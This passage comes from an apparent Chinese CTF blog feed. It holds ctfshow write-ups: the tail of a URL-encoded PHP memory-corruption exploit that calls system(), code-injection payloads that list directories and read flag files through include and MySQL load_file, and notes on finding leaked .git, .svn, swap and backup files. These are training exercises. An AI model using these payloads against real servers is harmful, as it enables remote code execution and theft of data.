class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">die</span>(%22<span class=\"title\">Couldn</span>%27<span class=\"title\">t</span>+<span class=\"title\">get</span>+<span class=\"title\">basic_functions</span>+<span class=\"title\">address</span>%22)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">if</span>(!(%24<span class=\"title\">zif_system</span>+%3<span class=\"title\">d</span>+<span class=\"title\">get_system</span>(%24<span class=\"title\">basic_funcs</span>)))+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">die</span>(%22<span class=\"title\">Couldn</span>%27<span class=\"title\">t</span>+<span class=\"title\">get</span>+<span class=\"title\">zif_system</span>+<span class=\"title\">address</span>%22)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%23+<span class=\"title\">fake</span>+<span class=\"title\">closure</span>+<span class=\"title\">object</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">fake_obj_offset</span>+%3<span class=\"title\">d</span>+0<span class=\"title\">xd0</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">for</span>(%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+0<span class=\"title\">x110</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%2<span class=\"title\">b</span>%3<span class=\"title\">d</span>+8)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">fake_obj_offset</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">c</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">closure_obj</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">i</span>))%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%23+<span class=\"title\">pwn</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x20</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">abc_addr</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">fake_obj_offset</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">xd0</span>+%2<span class=\"title\">b</span>+0<span class=\"title\">x38</span>%2<span class=\"title\">c</span>+1%2<span class=\"title\">c</span>+4)%3<span class=\"title\">b</span>+%23+<span class=\"title\">internal</span>+<span class=\"title\">func</span>+<span class=\"title\">type</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">xd0</span>+%2<span class=\"title\">b</span>+0<span class=\"title\">x68</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">zif_system</span>)%3<span class=\"title\">b</span>+%23+<span class=\"title\">internal</span>+<span class=\"title\">func</span>+<span class=\"title\">handler</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++(%24<span class=\"title\">helper</span>-%3<span class=\"title\">eb</span>)(%24<span class=\"title\">cmd</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">exit</span>()%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%7<span class=\"title\">d</span></span></span><br></pre></td></tr></table></figure>\n<h1 id=\"web73\"><a class=\"markdownIt-Anchor\" href=\"#web73\">#</a> Web73：</h1>\n<p>​\t\t又是，没源码，那就 glob 遍历文件目录吧，当然 var_export 也可以做到这里没有被 ban：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">DirectoryIterator</span>(<span class=\"string\">&quot;glob:///*&quot;</span>);<span class=\"keyword\">foreach</span>(<span class=\"variable\">$a</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>)&#123;<span class=\"keyword\">echo</span> <span class=\"variable\">$f</span>.<span class=\"string\">&quot;    &quot;</span> ;&#125;<span class=\"keyword\">exit</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t突然发现 include 读取文件又可以了，直接读：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"title function_ invoke__\">indlude</span>(<span class=\"string\">&quot;/flagc.txt&quot;</span>);<span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n<h1 id=\"web74\"><a class=\"markdownIt-Anchor\" href=\"#web74\">#</a> Web74：</h1>\n<p>​\t\t这一题 ban 了 scandir，那就直接 glob 绕过：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">DirectoryIterator</span>(<span class=\"string\">&quot;glob:///*&quot;</span>);<span class=\"keyword\">foreach</span>(<span class=\"variable\">$a</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>)&#123;<span class=\"keyword\">echo</span> <span class=\"variable\">$f</span>.<span class=\"string\">&quot;    &quot;</span> ;&#125;<span class=\"keyword\">exit</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 include 去读。</p>\n<h1 id=\"web75\"><a class=\"markdownIt-Anchor\" href=\"#web75\">#</a> Web75：</h1>\n<p>​\t\tglob 读根目录结构：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">DirectoryIterator</span>(<span class=\"string\">&quot;glob:///*&quot;</span>);<span class=\"keyword\">foreach</span>(<span class=\"variable\">$a</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>)&#123;<span class=\"keyword\">echo</span> <span class=\"variable\">$f</span>.<span class=\"string\">&quot;    &quot;</span> ;&#125;<span class=\"keyword\">exit</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t多次测试，发现无法读取文件，可以试着利用 mysql 去读取文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"variable\">$dbh</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">PDO</span>(<span class=\"string\">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">foreach</span>(<span class=\"variable\">$dbh</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class=\"keyword\">as</span> <span class=\"variable\">$row</span>) &#123;  </span><br><span class=\"line\">      <span class=\"keyword\">echo</span>(<span class=\"variable\">$row</span>[<span class=\"number\">0</span>]).<span class=\"string\">&quot;|&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$dbh</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (PDOException <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"variable\">$e</span>-&gt;<span class=\"title function_ invoke__\">getMessage</span>();</span><br><span class=\"line\">  <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;;<span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n<p>​\t\t简单解释一下这个 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 使用PDO（PHP Data Objects）创建一个新的数据库连接对象，指定DSN、用户名（root）和密码（root）</span></span><br><span class=\"line\">    <span class=\"variable\">$dbh</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">PDO</span>(<span class=\"string\">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 执行一个SQL查询，从指定的文件（/flag36.txt）中读取内容</span></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>(<span class=\"variable\">$dbh</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class=\"keyword\">as</span> <span class=\"variable\">$row</span>) &#123;  </span><br><span class=\"line\">        <span class=\"comment\">// 输出读取到的内容，并追加一个竖线（|）</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span>(<span class=\"variable\">$row</span>[<span class=\"number\">0</span>]).<span class=\"string\">&quot;|&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 将数据库连接对象设置为null，关闭连接</span></span><br><span class=\"line\">    <span class=\"variable\">$dbh</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (PDOException <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果发生PDO异常，输出错误信息</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$e</span>-&gt;<span class=\"title function_ invoke__\">getMessage</span>();</span><br><span class=\"line\">    <span class=\"comment\">// 终止脚本执行</span></span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">// 终止脚本执行</span></span><br><span class=\"line\"><span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n<h1 id=\"web76\"><a class=\"markdownIt-Anchor\" href=\"#web76\">#</a> Web76：</h1>\n<p>​\t\t还是 glob 读文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">DirectoryIterator</span>(<span class=\"string\">&quot;glob:///*&quot;</span>);<span class=\"keyword\">foreach</span>(<span class=\"variable\">$a</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>)&#123;<span class=\"keyword\">echo</span> <span class=\"variable\">$f</span>.<span class=\"string\">&quot;    &quot;</span> ;&#125;<span class=\"keyword\">exit</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>\n<p>​\t\t还是老样子，MySQL 读文件一把梭：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"variable\">$dbh</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">PDO</span>(<span class=\"string\">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">foreach</span>(<span class=\"variable\">$dbh</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class=\"keyword\">as</span> <span class=\"variable\">$row</span>) &#123;  </span><br><span class=\"line\">      <span class=\"keyword\">echo</span>(<span class=\"variable\">$row</span>[<span class=\"number\">0</span>]).<span class=\"string\">&quot;|&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$dbh</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (PDOException <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"variable\">$e</span>-&gt;<span class=\"title function_ invoke__\">getMessage</span>();</span><br><span class=\"line\">  <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;;<span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n<h1 id=\"一些总结文章\"><a class=\"markdownIt-Anchor\" href=\"#一些总结文章\">#</a> 一些总结文章：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzE1OTU3L2FydGljbGUvZGV0YWlscy8xMTg4NTU4NjU/b3BzX3JlcXVlc3RfbWlzYz0mYW1wO3JlcXVlc3RfaWQ9JmFtcDtiaXpfaWQ9MTAyJmFtcDt1dG1fdGVybT1saW51eCVFNSU4RiU5NiVFNSU4RiU4RCVFNSU5MSVCRCVFNCVCQiVBNHJjZSVFOCU4NCU5QSVFNiU5QyVBQyZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+c29iYWlkdXdlYn5kZWZhdWx0LTEtMTE4ODU1ODY1LjE0MiU1RXYxMDAlNUVwY19zZWFyY2hfcmVzdWx0X2Jhc2U2JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">总结 rce（远程代码执行各种 sao 姿势）绕过 bypass</span></p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/97a7dff3.html",
            "url": "http://blog.g01den.top/posts/97a7dff3.html",
            "title": "ctfshow-信息搜集",
            "date_published": "2024-09-14T08:55:17.000Z",
            "content_html": "<h1 id=\"web1\"><a class=\"markdownIt-Anchor\" href=\"#web1\">#</a> Web1：</h1>\n<p>​\t\t题目描述：开发注释未及时删除 。</p>\n<p>​\t\t打开题目后提示 web1:where is flag?</p>\n<p>​\t\tctrl+u 读取源码。</p>\n<h1 id=\"web2\"><a class=\"markdownIt-Anchor\" href=\"#web2\">#</a> Web2：</h1>\n<p>​\t\t题目描述：js 前台拦截 === 无效操作</p>\n<p>​\t\t打开题目后显示：无法查看源代码</p>\n<p>​\t\t右键无法用，但是 ctrl+u 可以用。</p>\n<h1 id=\"web3\"><a class=\"markdownIt-Anchor\" href=\"#web3\">#</a> Web3：</h1>\n<p>​\t\t提示要抓包，那就抓包，发送到 repeater，响应头里发现 flag。</p>\n<h1 id=\"web4\"><a class=\"markdownIt-Anchor\" href=\"#web4\">#</a> Web4：</h1>\n<p>​\t\t题目描述：总有人把后台地址写入 robots，帮黑阔大佬们引路。</p>\n<p>​\t\t基础知识：Robots 协议（也称<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclODglQUMlRTglOTklQUImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">爬虫</span>协议，机器人协议等）的全称是 “网络爬虫排除协议”，网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p>\n<blockquote>\n<p>Robots 参数：</p>\n<p>User-agent：</p>\n<p>作用：用于描述搜索引擎蜘蛛的名字；</p>\n<p>技巧：</p>\n<p>1，当 robots.txt 不为空的时候，必须至少有一条 user-agent 的记录；</p>\n<p>2，相同名字，只能有一条，但是不同的蜘蛛，可以有多条记录；</p>\n<p>Disallow：</p>\n<p>作用：用于描述不允许搜索引擎蜘蛛爬行和抓取的 url；</p>\n<p>使用技巧：</p>\n<p>在 robots.txt 中至少要有一条 disallow；<br>\nDisallow 记录为空，则表示网站所有页面都允许被抓取；<br>\n使用 disallow，每个页面必须单独分开声明；<br>\n注意 disallow：/abc/ 和 disallow：/abc 的区别；</p>\n<p>Allow：</p>\n<p>作用：用于描述搜索引擎蜘蛛爬行和抓取的 url；</p>\n<p>使用技巧：搜索引擎默认所有的 url 是 Allow；</p>\n</blockquote>\n<p>​\t\t访问 robots.txt 文件发现如下：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /flagishere.txt</span><br></pre></td></tr></table></figure>\n<p>​\t\t访问这个文件后得到 flag。</p>\n<h1 id=\"web5\"><a class=\"markdownIt-Anchor\" href=\"#web5\">#</a> Web5：</h1>\n<p>​\t\t题目描述：phps 源码泄露有时候能帮上忙</p>\n<p>​\t\t前置知识：<strong>phps 文件</strong>就是 php 的源代码文件，通常用于提供给用户（访问者）直接通过 Web 浏览器查看 php 代码的内容。</p>\n<p>​\t\t访问 index.phps 文件下载后打开即可得到 flag。</p>\n<h1 id=\"web6\"><a class=\"markdownIt-Anchor\" href=\"#web6\">#</a> Web6：</h1>\n<p>​\t\t题目描述：解压源码到当前目录，测试正常，收工</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  常见的网站源码备份文件后缀：</span><br><span class=\"line\"></span><br><span class=\"line\">tar</span><br><span class=\"line\">tar.gz</span><br><span class=\"line\">zip</span><br><span class=\"line\">rar</span><br><span class=\"line\">  常见的网站源码备份文件名：</span><br><span class=\"line\">web</span><br><span class=\"line\">website</span><br><span class=\"line\">backup</span><br><span class=\"line\">back</span><br><span class=\"line\">www</span><br><span class=\"line\">wwwroot</span><br><span class=\"line\">temp</span><br></pre></td></tr></table></figure>\n<p>​\t\t访问 www.zip 获得源码，里面有 flag。</p>\n<h1 id=\"web7\"><a class=\"markdownIt-Anchor\" href=\"#web7\">#</a> Web7：</h1>\n<p>​\t\t题目描述：版本控制很重要，但不要部署到生产环境更重要。</p>\n<p>​\t\tgit 泄露，直接访问 /.git/ 即可，或者 Githack 一把梭。</p>\n<h1 id=\"web8\"><a class=\"markdownIt-Anchor\" href=\"#web8\">#</a> Web8：</h1>\n<p>​\t\t题目描述：版本控制很重要，但不要部署到生产环境更重要。</p>\n<p>​\t\t.svn 泄露，直接访问。</p>\n<h1 id=\"web9\"><a class=\"markdownIt-Anchor\" href=\"#web9\">#</a> Web9：</h1>\n<p>​\t\t题目描述：发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了</p>\n<pre><code>\tvim泄露：当vim异常退出时，都会生成一个用于备份缓冲区内容的swp临时文件，来记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。假如原文件名为index.php\n\n第一次产生的交换文件名为.index.php.swp\n第二次产生的交换文件名为.index.php.swo\n第三次产生的交换文件名为.index.php.swn\n</code></pre>\n<p>​\t\t访问这个文件 <code>index.php.swp</code> ，然后记事本打开拿到 flag。</p>\n<h1 id=\"web10\"><a class=\"markdownIt-Anchor\" href=\"#web10\">#</a> Web10：</h1>\n<p>​\t\t题目描述：cookie 只是一块饼干，不能存放任何隐私数据。</p>\n<p>​\t\t抓包，在 cookie 处发现 flag。</p>\n<h1 id=\"web11\"><a class=\"markdownIt-Anchor\" href=\"#web11\">#</a> Web11：</h1>\n<p>​\t\t题目描述：域名其实也可以隐藏信息，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLWY5NmczMTVnLmN0ZnNob3cuY29t\">比如 flag.ctfshow.com</span> 就隐藏了一条信息</p>\n<p>​\t\t<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib2NlLmFsaXl1bi5jb20vaG9tZSVFOSU4NyU4QyVFOSU5RCVBMiVFNiU5RiVBNSVFNCVCRiVBMSVFNiU4MSVBRiVFRiVCQyU4QyVFNCVCRCU4NiVFNiU5OCVBRiVFNiU4OCU5MSVFNCVCOCU4RCVFNyU5RiVBNSVFOSU4MSU5MyVFNCVCOCVCQSVFNSU5NSVBNSVFNiU5RiVBNSVFNCVCOCU4RCVFNSU4OCVCMCVFRiVCQyU4QyVFNCVCOCU4RCVFNyVBRSVBMSVFNCVCQSU4NiVFMyU4MCU4Mg==\">https://boce.aliyun.com/home 里面查信息，但是我不知道为啥查不到，不管了。</span></p>\n<h1 id=\"web12\"><a class=\"markdownIt-Anchor\" href=\"#web12\">#</a> Web12：</h1>\n<p>​\t\t题目描述：有时候网站上的公开信息，就是管理员常用密码</p>\n<p>​\t\t访问 robots.txt 获取一些信息，就是 /admin/ 目录，访问后弹出来了个登陆框，密码一般是 admin，密码在 index 页面最下面：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Help Line Number : 372619038</span><br></pre></td></tr></table></figure>\n<h1 id=\"web13\"><a class=\"markdownIt-Anchor\" href=\"#web13\">#</a> Web13：</h1>\n<p>​\t\t题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>\n<p>​\t\t读源码，发现 document.pdf 文件，打开发现了账号密码和一个页面，进入这个文件后登陆发现 flag。</p>\n<h1 id=\"web14\"><a class=\"markdownIt-Anchor\" href=\"#web14\">#</a> Web14：</h1>\n<p>​\t\t题目描述：有时候源码里面就能不经意间泄露重要 (editor) 的信息，默认配置害死人</p>\n<p>​\t\t直接访问 /editor/ 目录，点插入文件，找到 flag 文件的大致文件结构，相对路径访问即可得到 flag。</p>\n<h1 id=\"web15\"><a class=\"markdownIt-Anchor\" href=\"#web15\">#</a> Web15：</h1>\n<p>​\t\t题目描述；公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>\n<p>​\t\t社工题，对真正技术没啥太大的关系。</p>\n<p>​\t\t直接拉到最下边，电话号码和邮箱都有，url 直接访问 admin，进入登陆后台，之后就是忘记密码，提示：我的所在地是哪个城市？根据 qq 邮箱的 qq 号发现属地，通过这个修改密码即可。</p>\n<h1 id=\"web16\"><a class=\"markdownIt-Anchor\" href=\"#web16\">#</a> Web16：</h1>\n<p>​\t\t题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>\n<p>​\t\t有大佬用 Wappalyzer 检测到了 PHP，但是访问 tz.php 的原因是啥不是很清楚。打开 tz.php 之后找到 PHP 相关参数，打开 PHPIINFO 然后搜索 ctfshow 即可发现 flag。</p>\n<h1 id=\"web17\"><a class=\"markdownIt-Anchor\" href=\"#web17\">#</a> Web17：</h1>\n<p>​\t\t题目描述：备份的 sql 文件会泄露敏感信息</p>\n<p>​\t\tsql 文件的备份一般为 backup.sql，所以访问下载这个文件，记事本打开之后找到了如下语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `ctfshow_secret` <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;ctfshow&#123;40b3ed5b-2454-49c7-a6ad-77e5cc738e2f&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"web18\"><a class=\"markdownIt-Anchor\" href=\"#web18\">#</a> Web18：</h1>\n<p>​\t\t题目描述：不要着急，休息，休息一会儿，玩 101 分给你 flag</p>\n<p>​\t\t读 js 源码，找到以下逻辑：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(score&gt;<span class=\"number\">100</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> result=<span class=\"variable language_\">window</span>.<span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\tunicode 解码是：你赢了，去幺幺零点皮爱吃皮看看，提示读取 110.php，读取后获得 flag。</p>\n<h1 id=\"web19\"><a class=\"markdownIt-Anchor\" href=\"#web19\">#</a> Web19：</h1>\n<p>​\t\t题目描述：密钥什么的，就不要放在前端了</p>\n<p>​\t\t读源码，找到了被注释的 php 代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>=<span class=\"string\">&quot;fakeflag&quot;</span></span><br><span class=\"line\">    <span class=\"variable\">$u</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$p</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pazzword&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$u</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$p</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$u</span>===<span class=\"string\">&#x27;admin&#x27;</span> &amp;&amp; <span class=\"variable\">$p</span> ===<span class=\"string\">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    --&gt;</span><br></pre></td></tr></table></figure>\n<p>​\t\t账号密码都有了，后端抓包改包发送即可获得 flag。</p>\n<h1 id=\"web20\"><a class=\"markdownIt-Anchor\" href=\"#web20\">#</a> Web20：</h1>\n<p>​\t\t题目描述：mdb 文件是早期 asp+access 构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>\n<p>​\t\t扫后台发现了 db 文件，下载即可，之后用数据库管理工具打开即可得到 flag。</p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/ff5b88d5.html",
            "url": "http://blog.g01den.top/posts/ff5b88d5.html",
            "title": "python原型链污染",
            "date_published": "2024-07-20T20:48:16.000Z",
